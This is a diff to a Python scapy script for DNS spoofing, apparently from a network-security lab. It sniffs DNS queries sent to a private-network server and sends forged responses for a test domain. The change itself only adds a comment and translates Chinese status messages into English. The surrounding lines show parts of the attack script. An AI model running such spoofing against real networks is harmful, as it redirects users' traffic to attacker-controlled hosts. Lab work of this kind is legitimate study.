@@ -2,6 +2,7 @@
 from scapy.all import *
 import time
 
+# Configuration parameters
 DNS_SERVER_IP = "10.10.27.2"
 ATTACK_IFACE = "br-xxx"
 TARGET_DOMAIN = "www.hust-cse.com"
@@ -56,11 +57,11 @@ def spoof_dns_response(pkt):
         
         spoof_pkt = ip_layer / udp_layer / dns_layer
         send(spoof_pkt, iface=ATTACK_IFACE, verbose=0)
-        print(f"[+] 已伪造{TARGET_DOMAIN}的响应包，发送至{DNS_SERVER_IP}")
+        print(f"[+] Spoofed response for {TARGET_DOMAIN} sent to {DNS_SERVER_IP}")
 
 if __name__ == "__main__":
-    print(f"[*] 开始监听{DNS_SERVER_IP}的DNS查询（接口：{ATTACK_IFACE}）")
-    print(f"[*] 攻击持续运行中，按Ctrl+C停止")
+    print(f"[*] Started monitoring DNS queries to {DNS_SERVER_IP} (Interface: {ATTACK_IFACE})")
+    print(f"[*] Attack is running continuously. Press Ctrl+C to stop")
     sniff(
         filter=f"udp port 53 and dst host {DNS_SERVER_IP}",
         prn=spoof_dns_response,
